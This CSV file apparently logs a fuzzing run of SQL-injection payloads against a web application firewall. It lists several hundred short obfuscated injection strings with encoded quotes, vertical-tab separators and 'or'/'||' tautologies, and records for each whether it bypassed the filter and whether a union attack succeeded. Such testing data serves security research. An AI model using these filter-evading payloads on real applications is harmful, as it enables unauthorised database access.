Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0199,69.77,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0189,69.77,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,69.77,No,200
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0141,69.77,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,69.77,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,69.77,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0212,69.77,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0114,69.77,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0064,69.77,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0125,69.77,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0164,69.77,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0135,69.77,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,69.77,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0162,69.77,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0143,69.77,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0091,69.77,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,69.77,No,200
0%27or+1<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0106,69.77,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.012,69.77,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0136,69.77,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0108,69.77,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0097,69.77,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0184,69.77,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0229,69.77,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0156,69.77,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0126,69.77,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0199,69.77,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0171,69.89,No,500
0'or+@<@.%0b||,Bypassed,No,None,Unknown,0.0098,70.01,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,70.27,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.009,70.65,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0164,70.65,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.009,70.65,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0088,70.65,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0125,70.65,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,70.65,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0192,70.65,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0187,69.54,No,500
0'<@!=1+or+,Bypassed,No,None,Unknown,0.014,69.77,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0089,69.77,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0125,69.77,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0211,69.77,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0095,69.77,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0125,69.77,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0106,69.77,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0183,69.77,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.014,69.77,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0182,69.77,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.019,69.77,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0191,69.77,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0159,69.77,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0189,69.77,No,500
0'or+@<@.+||,Bypassed,No,None,Unknown,0.0072,69.77,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0183,69.77,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0146,69.77,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0107,69.77,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0119,69.77,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0084,69.77,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0161,69.77,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0132,69.77,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0179,69.77,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,69.77,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0102,69.77,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0184,69.77,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0155,69.77,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0103,69.77,No,500
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0145,69.77,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0095,69.77,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0116,69.77,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0167,69.77,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0085,69.77,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0125,69.77,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,69.77,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0206,69.77,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0145,69.89,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0072,70.01,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,70.4,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0094,70.65,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.014,70.65,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0115,70.65,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0105,70.65,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0115,70.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0079,70.65,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0098,70.65,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0175,70.65,No,500
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0189,70.65,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0155,69.5,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0136,69.77,No,500
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0141,69.77,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0097,69.77,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,69.77,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,69.77,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0101,69.77,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.01,69.77,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0124,69.77,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0113,69.77,No,500
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0083,69.77,No,200
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0191,69.77,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0186,69.77,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,69.77,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0167,69.77,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0163,69.77,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,69.77,No,200
0'or%0b!@<@.+||,Bypassed,No,None,Unknown,0.0151,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0144,69.77,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0073,69.77,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0134,69.77,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0223,69.77,No,500
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0106,69.77,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0087,69.77,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0146,69.77,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.015,69.77,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0069,69.77,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0125,69.77,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.008,69.77,No,500
0'or+!@<@+||,Bypassed,No,None,Unknown,0.0131,69.77,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0127,69.77,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,69.77,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0098,69.77,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0137,69.77,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.017,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0162,69.77,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0155,69.77,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0216,69.77,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0123,69.77,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0098,69.77,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0158,69.77,No,500
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0137,69.89,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0171,70.01,No,500
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0088,70.27,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0129,70.65,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0171,70.65,No,200
0'or%0b@<@+||,Bypassed,No,None,Unknown,0.0123,70.65,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0173,70.65,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0101,70.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0064,70.65,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0191,69.54,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0157,69.77,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.021,69.77,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0156,69.77,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,69.77,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0066,69.77,No,200
0'||%0b@<@.+||,Bypassed,No,None,Unknown,0.0147,69.77,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0108,69.77,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0117,69.77,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.011,69.77,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0148,69.77,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0142,69.77,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.018,69.77,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0205,69.77,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0181,69.77,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0139,69.77,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,69.77,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.017,69.77,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0116,69.77,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0105,69.77,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,69.77,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0082,69.77,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0175,69.77,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.017,69.77,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0099,69.77,No,500
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0125,69.77,No,500
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0073,69.77,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0095,69.77,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.011,69.77,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0193,69.77,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0073,69.77,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0124,69.77,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0072,69.77,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0212,69.77,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0127,69.77,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.016,69.77,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0151,69.77,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0135,69.77,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0106,69.77,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.014,70.01,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.014,70.13,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0095,70.46,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0089,70.65,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0174,70.65,No,200
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0086,70.65,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,70.65,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0139,70.65,No,500
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0137,70.65,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0232,70.65,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,70.65,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0098,70.65,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0135,70.65,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0214,70.65,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0203,70.65,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0239,70.65,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0101,70.65,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0139,70.65,No,500
0'||+@<@.+or,Bypassed,No,None,Unknown,0.0091,70.65,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0213,70.65,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0152,70.65,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0152,70.65,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0287,70.65,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0107,70.65,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0179,70.65,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0163,70.65,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0163,70.65,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0199,70.65,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0116,70.65,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0117,70.65,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0235,70.65,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0095,70.65,No,500
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0139,70.65,No,500
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0125,70.65,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0139,70.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0149,70.65,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,70.65,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0298,70.65,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,70.65,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0148,70.65,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0171,70.65,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0281,70.65,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0144,70.65,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0227,70.65,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0148,70.65,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.01,70.65,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0126,70.65,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0099,70.65,No,500
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0164,70.65,No,500
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0094,70.65,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.021,70.65,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0108,70.75,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0176,71.0,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.015,71.36,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0149,71.54,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0094,71.54,No,500
0'||+1<@.%0bor,Bypassed,No,None,Unknown,0.013,71.54,No,500
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0188,71.54,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.013,71.54,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,71.54,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,70.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0248,70.65,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0176,70.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0192,70.65,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0167,70.65,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0134,70.65,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0234,70.65,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.017,70.65,No,500
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,70.65,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0125,70.65,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0087,70.65,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0143,70.65,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0126,70.65,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.023,70.65,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0185,70.65,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0128,70.65,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0172,70.65,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0259,70.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0363,70.65,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.011,70.65,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,70.65,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0192,70.65,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,70.65,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0105,70.65,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0275,70.65,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0191,70.65,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.015,70.65,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0182,70.65,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.013,70.65,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0171,70.65,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0182,70.65,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.011,70.65,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0083,70.65,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0084,70.65,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0131,70.65,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0075,70.65,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,70.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0107,70.65,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.016,70.65,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0142,70.65,No,500
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0082,70.75,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0121,71.01,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.016,71.54,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0119,71.54,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0165,71.54,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0139,71.54,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0151,71.54,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0093,71.54,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0088,71.54,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0145,71.54,No,200
0'||+1<@.%0bor,Bypassed,No,None,Unknown,0.0276,70.65,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0221,70.65,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.025,70.65,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0132,70.65,No,200
0%27||%0b@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.018,70.65,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0225,70.65,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0149,70.65,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,70.65,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0162,70.65,No,500
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0125,70.65,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.027,70.65,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0184,70.65,No,500
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0188,70.65,No,200
0'||%0b1<@.+or,Bypassed,No,None,Unknown,0.0135,70.65,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0162,70.65,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0167,70.65,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0162,70.65,No,200
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0099,70.65,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0181,70.65,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0169,70.65,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.016,70.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0162,70.65,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,70.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0157,70.65,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0242,70.65,No,500
